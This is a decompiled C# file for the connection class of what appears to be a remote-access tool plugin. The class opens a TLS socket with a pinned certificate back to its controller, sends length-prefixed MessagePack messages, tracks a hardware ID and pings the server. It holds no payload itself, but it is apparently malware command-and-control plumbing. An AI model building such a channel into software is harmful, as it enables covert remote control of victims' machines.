using System;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using MessagePackLib.MessagePack;

namespace Plugin
{
	// Token: 0x0200002B RID: 43
	public static class Connection
	{
		// Token: 0x17000014 RID: 20
		// (get) Token: 0x060000BD RID: 189 RVA: 0x00007A3C File Offset: 0x00005C3C
		// (set) Token: 0x060000BE RID: 190 RVA: 0x00007A44 File Offset: 0x00005C44
		public static Socket TcpClient { get; set; }

		// Token: 0x17000015 RID: 21
		// (get) Token: 0x060000BF RID: 191 RVA: 0x00007A4C File Offset: 0x00005C4C
		// (set) Token: 0x060000C0 RID: 192 RVA: 0x00007A54 File Offset: 0x00005C54
		public static SslStream SslClient { get; set; }

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x060000C1 RID: 193 RVA: 0x00007A5C File Offset: 0x00005C5C
		// (set) Token: 0x060000C2 RID: 194 RVA: 0x00007A64 File Offset: 0x00005C64
		public static X509Certificate2 ServerCertificate { get; set; }

		// Token: 0x17000017 RID: 23
		// (get) Token: 0x060000C3 RID: 195 RVA: 0x00007A6C File Offset: 0x00005C6C
		// (set) Token: 0x060000C4 RID: 196 RVA: 0x00007A74 File Offset: 0x00005C74
		public static bool IsConnected { get; set; }

		// Token: 0x17000018 RID: 24
		// (get) Token: 0x060000C5 RID: 197 RVA: 0x00007A7C File Offset: 0x00005C7C
		private static object SendSync { get; } = new object();

		// Token: 0x17000019 RID: 25
		// (get) Token: 0x060000C6 RID: 198 RVA: 0x00007A84 File Offset: 0x00005C84
		// (set) Token: 0x060000C7 RID: 199 RVA: 0x00007A8C File Offset: 0x00005C8C
		public static string Hwid { get; set; }

		// Token: 0x060000C8 RID: 200 RVA: 0x00007A94 File Offset: 0x00005C94
		public static void InitializeClient(byte[] packet)
		{
			try
			{
				Connection.TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
				{
					ReceiveBufferSize = 204800,
					SendBufferSize = 204800
				};
				Connection.TcpClient.Connect(Plugin.Socket.RemoteEndPoint.ToString().Split(new char[] { ':' })[0], Convert.ToInt32(Plugin.Socket.RemoteEndPoint.ToString().Split(new char[] { ':' })[1]));
				bool connected = Connection.TcpClient.Connected;
				if (connected)
				{
					Connection.IsConnected = true;
					Connection.SslClient = new SslStream(new NetworkStream(Connection.TcpClient, true), false, new RemoteCertificateValidationCallback(Connection.ValidateServerCertificate));
					Connection.SslClient.AuthenticateAsClient(Connection.TcpClient.RemoteEndPoint.ToString().Split(new char[] { ':' })[0], null, SslProtocols.Tls, false);
					new Thread(delegate
					{
						Packet.Read();
					}).Start();
				}
				else
				{
					Connection.IsConnected = false;
				}
			}
			catch
			{
				Connection.IsConnected = false;
			}
		}

		// Token: 0x060000C9 RID: 201 RVA: 0x00007C08 File Offset: 0x00005E08
		private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
		{
			return Connection.ServerCertificate.Equals(certificate);
		}

		// Token: 0x060000CA RID: 202 RVA: 0x00007C2C File Offset: 0x00005E2C
		public static void Disconnected()
		{
			try
			{
				Connection.IsConnected = false;
				SslStream sslClient = Connection.SslClient;
				if (sslClient != null)
				{
					sslClient.Dispose();
				}
				Socket tcpClient = Connection.TcpClient;
				if (tcpClient != null)
				{
					tcpClient.Dispose();
				}
				GC.Collect();
			}
			catch
			{
			}
		}

		// Token: 0x060000CB RID: 203 RVA: 0x00007C94 File Offset: 0x00005E94
		public static void Send(byte[] msg)
		{
			object sendSync = Connection.SendSync;
			lock (sendSync)
			{
				try
				{
					bool flag2 = !Connection.IsConnected || msg == null;
					if (!flag2)
					{
						byte[] bytes = BitConverter.GetBytes(msg.Length);
						Connection.TcpClient.Poll(-1, SelectMode.SelectWrite);
						Connection.SslClient.Write(bytes, 0, bytes.Length);
						bool flag3 = msg.Length > 1000000;
						if (flag3)
						{
							using (MemoryStream memoryStream = new MemoryStream(msg))
							{
								memoryStream.Position = 0L;
								byte[] array = new byte[50000];
								int num;
								while ((num = memoryStream.Read(array, 0, array.Length)) > 0)
								{
									Connection.TcpClient.Poll(-1, SelectMode.SelectWrite);
									Connection.SslClient.Write(array, 0, num);
									Connection.SslClient.Flush();
								}
							}
						}
						else
						{
							Connection.TcpClient.Poll(-1, SelectMode.SelectWrite);
							Connection.SslClient.Write(msg, 0, msg.Length);
							Connection.SslClient.Flush();
						}
					}
				}
				catch
				{
					Connection.IsConnected = false;
				}
			}
		}

		// Token: 0x060000CC RID: 204 RVA: 0x00007E38 File Offset: 0x00006038
		public static void CheckServer(object obj)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Ping!)";
			Connection.Send(msgPack.Encode2Bytes());
			GC.Collect();
		}
	}
}
